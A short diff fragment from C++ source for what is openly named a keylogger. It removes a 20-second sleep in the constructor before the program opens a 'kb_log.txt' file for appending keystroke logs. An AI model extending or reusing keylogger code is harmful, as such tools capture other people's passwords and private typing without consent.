@@ -40,8 +40,6 @@ Keylogger::Keylogger(wchar_t* k) {
 
     // errno = 0;
 
-    Sleep(20000);
-
     kblog = std::ofstream("kb_log.txt", std::ios::app);
 
     std::cerr << "After OPEN: " << kblog.is_open() << std::endl;
